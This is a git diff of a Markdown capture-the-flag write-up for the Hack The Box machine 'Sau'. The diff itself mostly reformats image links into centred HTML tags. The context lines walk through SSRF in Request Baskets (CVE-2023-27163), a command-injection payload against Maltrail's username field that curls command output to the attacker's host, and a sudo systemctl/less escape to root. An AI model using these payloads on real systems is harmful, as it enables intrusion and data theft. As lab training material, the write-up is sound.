@@ -89,13 +89,19 @@ sudo nmap -sVC -p- -vv -T5 sau.htb -oN sau_tcp_scan
 
 > The principle of operation is quite simple. A basket is created with a unique `url` endpoint:
 
-![create_basket](./screenshots/create_basket.png)
+<p align="center">
+  <img src="./screenshots/create_basket.png" alt="create_basket"/>
+</p>
 
 > The provided `url` with our basket endpoint can be used to make requests:
 
-![basket](./screenshots/basket.png)
+<p align="center">
+  <img src="./screenshots/basket.png" alt="basket"/>
+</p>
 
-![get_request_basket](./screenshots/get_request_basket.png)
+<p align="center">
+  <img src="./screenshots/get_request_basket.png" alt="get_request_basket"/>
+</p>
 
 > All requests go to our `0fhwi18` basket. They can be viewed, analyzed, etc.
 
@@ -105,7 +111,9 @@ sudo nmap -sVC -p- -vv -T5 sau.htb -oN sau_tcp_scan
 > In the application settings there is a function `Forward Url` which allows you to redirect requests to another address.
 > As an example, I will indicate my system:
 
-![request_settings](./screenshots/request_settings.png)
+<p align="center">
+  <img src="./screenshots/request_settings.png" alt="request_settings"/>
+</p>
 
 > I send a `GET` request:
 
@@ -151,7 +159,9 @@ request to an internal resource that I should not have access to from the extern
 
 > According to our version **v1.2.1** of the `request basket` application, there is a **CVE** in the description of which it says so - `This vulnerability allows attackers to access network resources and sensitive information via a crafted API request.`:
 
-![CVE-2023-27163](./screenshots/CVE-2023-27163.png)
+<p align="center">
+  <img src="./screenshots/CVE-2023-27163.png" alt="CVE-2023"/>
+</p>
 
 ---
 ### 🔑 SSRF
@@ -181,24 +191,34 @@ Server: Maltrail/0.53
 
 > Go to browser:
 
-![maltrail_web](./screenshots/maltrail_web.png)
+<p align="center">
+  <img src="./screenshots/maltrail_web.png" alt="Maltrail_web"/>
+</p>
 
 > The resource running on `localhost` is `Maltrail` version `v0.53` - an IDS system that tracks suspicious traffic based on **blacklists**, **anomalies** and **signatures**.
 > After searching for the version of this system I found that it is vulnerable to `OS command Injection` for the `username` parameter:
 
-![maltrail_command_injection](./screenshots/maltrail_command_injection.png)
+<p align="center">
+  <img src="./screenshots/maltrail_command_injection.png" alt="maltrail_command_injection"/>
+</p>
 
-![maltrail_exploit_description](./screenshots/maltrail_exploit_description.png)
+<p align="center">
+  <img src="./screenshots/maltrail_exploit_description.png" alt="maltrail_exploit_description"/>
+</p>
 
 ### 🔑 Command Injection
 
 > On port `8338` is the login form for the **Maltrail** admin panel:
 
-![maltrail_admin_form](./screenshots/maltrail_admin_form.png)
+<p align="center">
+  <img src="./screenshots/maltrail_admin_form.png" alt="maltrail_admin_form"/>
+</p>
 
 > Intercepting request in `BurpSuite`:
 
-![maltrail_burp](./screenshots/maltrail_burp.png)
+<p align="center">
+  <img src="./screenshots/maltrail_burp.png" alt="maltrail_burp"/>
+</p>
 
 > To check the vulnerable `username` parameter, I will send a simple `POST` request with the embedded `id` command in `base64` encoding and via `xargs` I will redirect the
 > result of the encoded response to my server:
@@ -224,7 +244,9 @@ username=`id | base64 | xargs -I{} curl http://10.10.14.15:1111/{}`
 ```
 > Result:
 
-![python_server_answer](./screenshots/python_server_answer.png)
+<p align="center">
+  <img src="./screenshots/pytohn_server_answer.png" alt="python_server_answer"/>
+</p>
 
 > decode answer:
 
@@ -239,7 +261,9 @@ uid=1001(puma) gid=1001(puma) groups=1001(puma)
 
 > I'll write a simple **python script** that will send an encoded command with a **reverse shell** to the vulnerable `username` parameter:
 
-![maltrail_python_exploit](./screenshots/maltrail_python_exploit.png)
+<p align="center">
+  <img src="./screenshots/maltrail_python_exploit.png" alt="maltrail_python_exploit"/>
+</p>
 
 > run the exploit and get a reverse shell:
 
@@ -356,7 +380,9 @@ puma@sau:/opt/maltrail$ sudo /usr/bin/systemctl status trail.service
 
 > We can exit this mode back to the shell but with the `root` privileges preserved using the `!bash` combination:
 
-![less_escape](./screenshots/less_escape.png)
+<p align="center">
+  <img src="./screenshots/less_escape.png" alt="less_escape"/>
+</p>
 
 ```bash
 
